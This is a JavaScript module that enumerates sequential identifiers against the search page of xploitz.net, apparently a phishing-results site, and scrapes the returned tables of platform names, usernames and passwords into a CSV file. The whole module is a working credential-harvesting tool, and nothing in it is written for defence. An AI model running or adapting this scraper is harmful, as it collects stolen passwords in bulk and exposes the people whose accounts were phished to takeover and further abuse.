const FILE = require('fs') // eslint-disable-line no-unused-vars
const HTML = require('jsdom').JSDOM // eslint-disable-line no-unused-vars
const HTTP = require('sync-request') // eslint-disable-line no-unused-vars

class XPLOITZ {
  constructor () {
    this.count = 0
    this.ID = 'aaaaaaaa'
    this.output = 'Platform, User, Password, ID, Date\r\n\r\n'

    this.options = {
      body: 'identifier=',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    }
  }

  sequentialID () {
    this.ID = ((parseInt(this.ID, 36) + 1).toString(36)).replace(/0/g, 'a')
  }

  request () {
    console.log(`[OUT] ID: ${this.ID}`)
    this.options.body = `identifier=${this.ID}`
    const BODY = HTTP('POST', 'http://xploitz.net/search.php', this.options).getBody('utf8')
    if (!BODY.includes('No se encontraron resultados')) {
      this.valids++
      const WEB = new HTML(BODY)
      let accounts = WEB.window.document.getElementsByTagName('tr')
      console.log(`[OUT] # of Results: ${accounts.length - 1}`)

      for (let account of accounts) {
        let fields = account.getElementsByTagName('td')
        if (fields.length !== 0) {
          let Platform = fields[0].getElementsByTagName('img')[0].src
          Platform = Platform.substr(0, Platform.length - 4).substr(8)
          let User = fields[1].innerHTML
          let Password = fields[2].innerHTML
          let date = fields[4].innerHTML
          this.output += `${Platform},${User},${Password},${this.ID},${date}\r\n`
        }
      }
    } else console.log(`[ERR] ID ${this.ID} has no results`)

    this.sequentialID()
  }

  toCSV () {
    require('fs').writeFile('XPLOITZ.csv', this.output, 'utf8', function (err) {
      if (err) console.log(`[ERR] ${err.message}`)
      else console.log('[OUT] CSV created!')
    })
  }
}

module.exports = new XPLOITZ()
